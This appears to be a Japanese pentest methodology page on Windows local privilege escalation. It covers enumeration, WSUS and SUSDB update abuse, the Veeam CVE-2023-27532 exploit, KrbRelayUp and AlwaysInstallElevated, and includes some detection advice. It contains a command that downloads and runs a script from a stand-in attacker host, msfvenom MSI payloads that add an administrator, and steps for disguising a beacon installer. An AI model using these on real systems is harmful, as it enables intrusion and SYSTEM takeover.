# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows のローカル権限昇格ベクトルを探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、基礎的な複数のガイドに基づく、Windows 権限昇格の一般的な手法をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な列挙の流れには、コミュニティのワークショップやチェックリストの内容も取り入れています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去の攻撃手法については、Windows 権限昇格に関する DerbyCon のプレゼンテーションも含まれています。<sup>[[5]](#references)</sup>

## Windows の基礎知識

### アクセストークン

**Windows のアクセストークンについて知らない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL - DACLs/SACLs/ACEs

**ACL - DACLs/SACLs/ACEs の詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### 整合性レベル

**Windows の整合性レベルについて知らない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティ制御

Windows には、**システムの列挙**や実行ファイルの実行を**妨げたり**、さらには**活動を検知したり**する要素があります。権限昇格の列挙を始める前に、以下の**ページを読んで**、これらの**防御**メカニズムをすべて**列挙してください**。


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがあれば、オフラインでの UEFI NVRAM 編集を、起動前 DMA と Windows `SYSTEM` のメモリパッチ適用につなげることもできます。

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess によるサイレントな昇格

`RAiLaunchAdminProcess` を通じて起動された UIAccess プロセスは、AppInfo のセキュアパスチェックを回避すると、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection バイパス手順については、こちらを確認してください。

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop のアクセシビリティレジストリ伝播は、任意の SYSTEM レジストリ書き込み（RegPwn）に悪用できます。<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows ビルドでは、特権を持つローカル NTLM 認証が、再利用された SMB TCP 接続を介してリフレクトされる **SMB arbitrary-port** LPE 経路も導入されました。

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性があるか確認してください（適用済みのパッチも確認してください）。

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Version Exploits

Microsoft のセキュリティ脆弱性に関する詳細情報を検索するには、この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)が便利です。このデータベースには 4,700 件を超えるセキュリティ脆弱性が登録されており、Windows 環境が**非常に広い攻撃対象領域**となることがわかります。

**システム上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas には watson が組み込まれています)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OS のビルド、インストール済み更新プログラム、候補となるアドバイザリを一覧表示します。該当すると判断する前に、正確な製品と後続の更新プログラムを確認してください。

バージョン固有のローカル exploit を調べる場合は、OS のアーキテクチャだけでなく、**実行中のプロセスのアーキテクチャ**も確認してください。64-bit Windows では、32-bit プロセスは[WOW64 ファイル システム リダイレクター](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)の影響を受けます。通常、`%windir%\System32` は 32-bit システム ディレクトリに解決されますが、`%windir%\Sysnative` を使うと、そのプロセスからネイティブのシステム ディレクトリにアクセスできます。この別名は 64-bit プロセスでは利用できません。OS ビルドや未適用の KB の候補だけでは、exploit が実行可能であることの証明にはなりません。実行中のビルド、インストール済みまたは後続の更新プログラム、プロセスのアーキテクチャ、exploit の前提条件を、該当する issue の[Microsoft セキュリティ情報](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)と照合してください。

**システム情報を使ってローカルで確認**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**exploit の Github リポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

環境変数に credential/Juicy な情報が保存されていませんか？

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell の履歴

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell トランスクリプトファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で有効にする方法を確認できます。

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` はあくまで例です。[PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) は通常、各ユーザーの Documents フォルダーに書き込みますが、`OutputDirectory` 設定や `Start-Transcript -OutputDirectory` によって、共有フォルダーや隠しフォルダーにファイルをリダイレクトできます。トランスクリプトを確認する前に、実際の出力先とファイルの ACL を確認してください。トランスクリプトには、認証情報を含むコマンド引数や出力が記録されている場合があります。読み取り可能なトランスクリプトが手がかりになるのは、その内容から利用可能な高権限の ID が判明し、その ID で該当するコンテキストにログオンできる場合に限られます。

### PowerShell Module Logging

PowerShell パイプラインの実行に関する詳細が記録されます。これには、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、実行の詳細や出力結果がすべて記録されるとは限りません。

これを有効にするには、ドキュメントの「トランスクリプト ファイル」セクションの手順に従い、**「Powershell Transcription」**ではなく**「Module Logging」**を選択してください。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShellログから直近15件のイベントを表示するには、次を実行します:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

スクリプトの実行アクティビティと全内容の記録が取得され、コードの各ブロックが実行時にすべて記録されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、フォレンジック調査や悪意ある動作の分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な分析情報が得られます。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block のイベント ログは、Windows イベント ビューアーの **アプリケーションとサービス ログ > Microsoft > Windows > PowerShell > Operational** にあります。\
直近20件のイベントを表示するには、次を使用します:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### インターネット設定

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ドライブ

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

先ほどのガイダンスでは、リスクを次のように要約していました。

更新プログラムの取得に http**S** ではなく http が使われている場合、システムを侵害できる可能性があります。

HTTP の WSUS エンドポイントは、更新メタデータの傍受を調査する手掛かりになります。悪用できるかどうかは、クライアントがその WSUS サーバーを使用しているか、攻撃者が通信を傍受または制御できるか、そしてクライアントの更新プログラムに対する信頼設定やインストールポリシーにも左右されます。URL だけでは、コード実行が可能だとは判断できません。[Microsoft は WSUS メタデータに TLS を推奨しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus)。

まず、次のコマンドを cmd で実行し、ネットワークで非 SSL の WSUS 更新が使われているか確認します。

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

または、PowerShell では次のようにします：

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

次のような返信を受け取った場合:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

また、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` の値が `1` の場合。

元の適用可能性に関する記述は次のとおりでした。

その場合、**悪用可能です。** 最後のレジストリ値が `0` の場合、WSUS エントリは無視されます。

`UseWUServer` が `1` の場合、Windows Update は設定されたイントラネットサービスを使用します。これは HTTP interception の経路に必要な前提条件を確認するものですが、interception、悪意のある更新プログラムの受け入れ、または昇格された権限でのインストールが可能であることを証明するものではありません。`0` の場合、このポリシーで設定された WSUS エンドポイントは選択されません。

この脆弱性を悪用するには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) などのツールを使用できます。これらは、非 SSL の WSUS トラフィックに「fake」更新プログラムを注入する、weaponized な MiTM exploit スクリプトです。

調査内容はこちらを参照してください。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なレポートはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。<sup>[[33]](#references)</sup>\
基本的に、このバグが悪用する脆弱性は次のとおりです。

> ローカルユーザーの proxy を変更でき、Windows Update が Internet Explorer の設定で構成された proxy を使用する場合、ローカルで [PyWSUS](https://github.com/GoSecure/pywsus) を実行して自身のトラフィックを interception し、資産上で昇格されたユーザーとしてコードを実行できます。
>
> さらに、WSUS サービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUS のホスト名用に自己署名証明書を生成し、その証明書を現在のユーザーの証明書ストアに追加すると、HTTP と HTTPS の両方の WSUS トラフィックを interception できます。WSUS は、証明書に対して trust-on-first-use 型の検証を行う HSTS のような仕組みを使用していません。提示された証明書がユーザーによって信頼され、正しいホスト名を持つ場合、サービスはそれを受け入れます。

この脆弱性は、ツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（公開後）を使って悪用できます。

### WSUS 管理者が制御する更新プログラム

現在の ID が WSUS サーバー上で更新プログラムを**公開および承認**できる場合、別の経路が存在します。サーバーの `WSUS Administrators` グループへの実効的な所属と、委任された WSUS 権限を確認し、承認された更新プログラムを受け取るクライアントコンピューターグループを特定してください。[Microsoft は更新プログラムの承認に WSUS Administrator 権限を要求しており](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate)、[公開における信頼関係についても説明しています](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29)。クライアントは、ローカルで公開されたコンテンツに使用される署名証明書を信頼する必要があります。この経路を権限昇格として扱う前に、候補となる更新プログラムに署名があり受け入れられること、対象に適用可能であること、より高い権限のコンテキストでインストールされることを確認してください。HTTP の `WUServer` 値やグループ名だけでは、これらの条件が満たされるとは限りません。

### SUSDB のカスタム更新プログラム悪用: `.txt`/`.esd` による署名なしペイロード

これは、HTTP WSUS 接続を interception する場合とは異なる信頼境界の破綻です。前提条件は、カスタム更新プログラムを公開および承認するための、**WSUS データベース（`SUSDB`）のストアドプロシージャへの十分なアクセス権**です。実用的な侵入経路のひとつは、上流 WSUS コンピューターアカウントを中継して、`SUSDB` をホストする別の MSSQL サーバーに認証させることです。正確な前提条件は環境によって異なるため、SQL administrator 権限があると決めつけず、まず `EXECUTE` 権限を列挙してください。<sup>[[38]](#references)[[39]](#references)</sup>

HTTP/8530 から LDAP、SMB、または AD CS への WSUS クライアント認証を中継する別の攻撃経路については、[NTLM relay に WSUS HTTP を悪用する](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8)を参照してください。

#### 外部データベースへの relay とストアドプロシージャ権限の確認

WSUS が外部 SQL Server を使用する環境では、まず WSUS サーバーアカウントがデータベースに認証できるか、また NTLM relay がそのリスナーに到達するかを確認してください。サーバーの SQL ロールによっては、テーブルへの直接書き込みが拒否されても、更新プログラム公開用のストアドプロシージャを実行できる場合があります。`SUSDB` への `UPDATE` が失敗しただけでは、公開が阻止されているとは判断できません。カスタム更新プログラムを試す前に、認可された SQL セッションで実効 ID、ロールへの所属、ストアドプロシージャの権限を調べてください。<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

ライブの手順定義とインストール済みの `SoftwareDistributionPackage.xsd` は、有効な更新メタデータを再構築する際に役立ちます。バンドルの親とペイロードの子には、それぞれ `UpdateIdentity`（フラグメント型 `1`）、`LocalizedProperties`（`4`）、`ExtendedProperties`（`2`）が必要です。各 `spImportUpdate` 呼び出しが返すローカルリビジョン ID を記録し、バンドルの関係、ダイジェスト、サイズ、コンテンツ URL、リビジョンの整合性を保ってください。これは状態を保持する公開ワークフローであり、ストアドプロシージャの呼び出しが1回成功しただけでは、クライアント側で実行された証拠にはなりません。<sup>[[38]](#references)</sup>

#### 更新をビルドし、対象を指定して承認する

カスタム更新のワークフローでは、正規の WSUS 手順を、制限付きの公開 API として使用します。重要な状態遷移は次のとおりです。<sup>[[38]](#references)</sup>

| 段階 | 関連するストアドプロシージャ |
| --- | --- |
| 更新メタデータをインポートする | `spImportUpdate` |
| 前提条件、ローカライズ、拡張の XML フラグメントを保存する | `spSaveXMLFragment` |
| コンテンツダイジェストを攻撃者が制御する URL に関連付ける | `spSetBatchURL` |
| コンピューターグループを列挙・作成し、クライアントを追加する | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| そのグループへのインストールを承認する | `@actionID = 0` および `@isAssigned = 1` を指定した `spDeployUpdate` |

ファイル名、ダイジェスト、サイズ、`CommandLineInstallation` ハンドラーは、インポートされたメタデータおよびフラグメント全体で一致している必要があります。コンテンツ URL と対象グループを割り当てた後、最終的な承認処理は次のようになります。例の GUID をそのまま再利用せず、新しい更新 ID、グループ ID、デプロイ ID を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### 拡張子による signature bypass

WSUSは通常、任意の未署名実行可能コンテンツを拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` の .NET `VerifyFile` パスでは、指定されたファイル名が `.txt` または `.esd` で終わる場合、証明書チェックのフラグが false に設定されます。そのため、バイト列がテキストまたは正規のESDイメージであることを事前に確認せずに `CheckCertificateSignature` がスキップされます。したがって、たとえば `payload.exe.txt` という名前の変更されていないPEファイルは、コンテンツ検証を通過し、その後、更新プログラムのコマンドラインインストールハンドラーによって起動される可能性があります。これはポリシーと型の混同によるバグであり、署名の偽造ではありません。<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS互換のステージングと自動化

`spDeployUpdate` を呼び出すと、WSUSが登録済みコンテンツを取得します。配信元はBITSのHTTP要件を満たす必要があります。URLに到達できるだけでは不十分です。転送では最初に`HEAD`/`GET`フローが実行され、バイト範囲リクエストが使用されるためです。Rangeをサポートしていないサーバーでは、BITSにRangeプロトコルヘッダーが必要であることを示すWSUS同期の`EventId=364`が発生します。<sup>[[39]](#references)</sup>

調査用PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) は、インポート/フラグメント/URL/グループ/デプロイの一連の処理に必要なSQLを生成し、それを実行するための改変版MSSQLクライアントを含み、コンテンツをステージングする`BitsWebServer.py`も同梱しています。認可済みラボでの最小限の実行例は次のとおりです。<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### 非対話実行と再試行による永続化

クライアント側の動作はポリシーに依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` のオプション `4 - Auto download and schedule install` を設定すると、承認済みの更新プログラムがダウンロードされ、設定されたスケジュールに従ってインストールされます。ユーザーが手動で選択する必要はありません。テストでは、更新プログラムが失敗または未完了のままになったpayloadは、callbackプロセスの終了後すぐに再提示されました。そのため、再試行の動作が繰り返し実行される永続化につながる可能性があります。ただし、クライアントに更新失敗の状態が表示されるため、目立ちます。<sup>[[39]](#references)</sup>

#### 検知とハードニングの観点

この手法で役立つサーバー側およびクライアント側の観点は次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` での `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を監査し、新しいターゲットグループ、外部コンテンツの配信元、`.txt`/`.esd` の更新payload、想定外の主体（特にコンピューターアカウント以外）によるデプロイを調査する。
- `C:\Program Files\Update Services\LogFiles` を確認し、`ContentSyncAgent`、`FileVerified`、誤記された `FileVerficationFailed`、`EventId=364` を探す。検証結果をpayloadの拡張子やコンテンツのマジックナンバーと照合し、拡張子だけを信用しない。
- Windows Updateのインストールが繰り返し失敗・再試行されていないか、また `.txt` または `.esd` という名前のコンテンツからPEが実行されたり、予期しない子プロセスやネットワーク動作が発生したりしていないかを調査する。
- 対応している場合はデータベースサービスで認証のExtended Protectionを必須にし、データベースへのネットワークアクセスをWSUSサーバーと許可された管理システムに制限する。カスタム更新プロシージャに対する `EXECUTE` 権限を最小化し、監査する。

## サードパーティ製自動更新ツールとAgent IPC（local privesc）

多くのエンタープライズエージェントは、localhost IPCのインターフェースと特権更新チャネルを公開しています。登録先を攻撃者のサーバーに誘導でき、更新ツールが不正なroot CAや弱い署名者チェックを信頼する場合、ローカルユーザーは悪意のあるMSIを送り込み、SYSTEMサービスにインストールさせることができます。一般化した手法（Netskope stAgentSvcの手法、CVE-2025-0309に基づく）については、以下を参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532（TCP 9401経由でSYSTEM権限）

バージョン固有の元の説明と偵察に関する注記は次のとおりです。

Veeam B&R < `11.0.1.1261` は、**TCP/9401** でlocalhostサービスを公開しています。このサービスは攻撃者が制御するメッセージを処理するため、**NT AUTHORITY\SYSTEM** として任意のコマンドを実行できます。<sup>[[12]](#references)</sup>

- **偵察**: リスナーとバージョンを確認する。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。

Veeam Backup & ReplicationとCloud Connectは、デフォルトで**TCP/9401**のコアバックアップサービスを使用します。[Veeamのアドバイザリ](https://www.veeam.com/kb4424)では、バックアップネットワークの境界内で、暗号化された構成データベースの認証情報が認証なしで開示される問題が説明されています。また、別の公開PoCでは、**NT AUTHORITY\SYSTEM**としてコマンドを実行する手法が示されています。<sup>[[12]](#references)</sup> サービスはlocalhost以外にもバインドされる場合があるため、実際のアドレスとPIDを確認してください。

- **偵察**: TCP/9401が `Veeam.Backup.Service.exe` に属していることを確認し、インストール済み製品とパッチのメタデータを調べる。`netstat -ano | findstr 9401` と `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` は手がかりであり、完全なパッチ確認ではありません。
- **修正済みバージョンの下限**: Veeamは、最初の修正版として **11a build 11.0.1.1261 P20230227** と **12 build 12.0.0.1420 P20230223** を挙げています。それ以前のリリースは影響を受けます。4パートのファイルバージョンだけでは、同じビルド番号の未パッチのベースビルドと後続パッチを区別できません。境界となるビルドを修正済みと判断する前に、パッチ識別子を[ベンダーのビルド履歴](https://www.veeam.com/kb2680)と照合してください。
- **Exploit**: 必要なVeeam DLLとともに `VeeamHax.exe` などのPoCを同じディレクトリに配置し、ローカルソケット経由でSYSTEM payloadを実行する：

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

サービスは SYSTEM としてコマンドを実行します。

引用されている PoC は、追加の前提条件を満たす場合に SYSTEM としてコマンドを実行できることを示しています。ベンダーのアドバイザリでは、認証情報の漏えいに関する問題が説明されています。

## KrbRelayUp

元のデフォルト環境に関する説明は次のとおりです。

特定の条件下にある Windows **ドメイン**環境では、**ローカル権限昇格**の脆弱性が存在します。条件には、**LDAP signing が強制されていないこと**、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を構成できる自己権限を持つこと、さらにユーザーがドメイン内にコンピューターを作成できることが含まれます。これらの**要件**は**デフォルト設定**で満たされる点に注意してください。

適切な COM サーバーが認証を行い、リレーされたプリンシパルが対象オブジェクトへの権限を持つ場合、ローカル Kerberos relay により、低権限のログオンから特権ディレクトリ書き込みへ移行できます。[KrbRelay documents](https://github.com/cube0x0/KrbRelay) は、RBCD と `msDS-KeyCredentialLink` (shadow-credential) の両方の LDAP 書き込みに対応しており、KrbRelayUp はこれらの経路の一部を自動化します。RBCD のチェーンには、該当する委任設定と対象オブジェクトへの権限が必要です。一方、shadow-credential のチェーンには、key-credential の書き込み権限と、証明書認証経路をサポートする KDC が必要です。どちらの経路も、ドメインへの参加だけで成立するものではありません。

実際の DC の [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) と [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) のポリシー、リレーされる ID のオブジェクト ACL、選択した COM クラスの認証レベルと偽装レベルを確認してください。呼び出し元のログオンの種類と認証情報のコンテキストも重要です。WinRM セッションは、対話型ログオンや新しい資格情報を使ったログオンとは異なる動作をする場合があります。ファイアウォール/OXID のルーティングやインストール済みの更新プログラムも結果に影響します。許容的なポリシーや一致する ACL は、確認対象として扱ってください。受動的な列挙で COM coercion、relay 認証、ディレクトリへの書き込みを発生させてはなりません。マシンアカウントの shadow credential はマシンチケットにつながる可能性がありますが、そのアカウントが必要なディレクトリレプリケーション権限を持つ場合に限り、別途 DCSync へ進めます。

[**exploit は**](https://github.com/Dec0ne/KrbRelayUp) で確認してください。

攻撃の流れについて詳しくは、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>を確認してください。

## AlwaysInstallElevated

この2つのレジストリキーが**有効**（値が **0x1**）になっている**場合**、任意の権限レベルのユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

meterpreter session があれば、module **`exploit/windows/local/always_install_elevated`** を使ってこの手法を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` command を使うと、privileges を escalate するための Windows MSI binary をカレントディレクトリに作成できます。この script は、user/group の追加を促す precompiled MSI installer を書き出します（そのため GIU access が必要です）：

```
Write-UserAddMSI
```

作成したバイナリを実行して、権限を昇格させます。

### MSI Wrapper

このツールを使って MSI wrapper を作成する方法は、このチュートリアルを参照してください。**コマンドライン**を**実行**するだけなら、"**.bat**" ファイルをラップできます。

{{#ref}}
msi-wrapper.md
{{#endref}}

### WIXでMSIを作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual StudioでMSIを作成

- Cobalt StrikeまたはMetasploitで**新しいWindows EXE TCP payload**を生成し、`C:\privesc\beacon.exe`に保存します。
- **Visual Studio**を開き、**Create a new project**を選択して、検索ボックスに「installer」と入力します。**Setup Wizard**プロジェクトを選択し、**Next**をクリックします。
- **AlwaysPrivesc**のようにプロジェクト名を付け、場所に**`C:\privesc`**を指定します。**place solution and project in the same directory**を選択し、**Create**をクリックします。
- 手順3/4（含めるファイルの選択）が表示されるまで**Next**をクリックします。**Add**をクリックし、先ほど生成したBeacon payloadを選択します。次に**Finish**をクリックします。
- **Solution Explorer**で**AlwaysPrivesc**プロジェクトを選択し、**Properties**で**TargetPlatform**を**x86**から**x64**に変更します。
  - **Author**や**Manufacturer**など、インストールされるアプリをより正規のものに見せるために変更できるプロパティもあります。
- プロジェクトを右クリックし、**View > Custom Actions**を選択します。
- **Install**を右クリックし、**Add Custom Action**を選択します。
- **Application Folder**をダブルクリックし、**beacon.exe**ファイルを選択して**OK**をクリックします。これにより、インストーラーの実行直後にBeacon payloadが実行されます。
- **Custom Action Properties**で、**Run64Bit**を**True**に変更します。
- 最後に、**build**します。
  - 警告`File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`が表示された場合は、プラットフォームがx64に設定されていることを確認してください。

### MSIのインストール

悪意のある`.msi`ファイルの**インストール**を**バックグラウンドで**実行するには:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

この脆弱性の悪用には、次を使用できます: _exploit/windows/local/always_install_elevated_

## アンチウイルスと検出ツール

### 監査設定

これらの設定によって**ログ記録**される内容が決まるため、注意してください。

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding では、ログがどこに送信されるかを把握しておくとよいでしょう。

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**は、ドメインに参加しているコンピューターの**ローカル Administrator パスワードを管理**し、各パスワードが**一意でランダムに生成され、定期的に更新される**ように設計されています。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、許可されたユーザーはローカル管理者パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

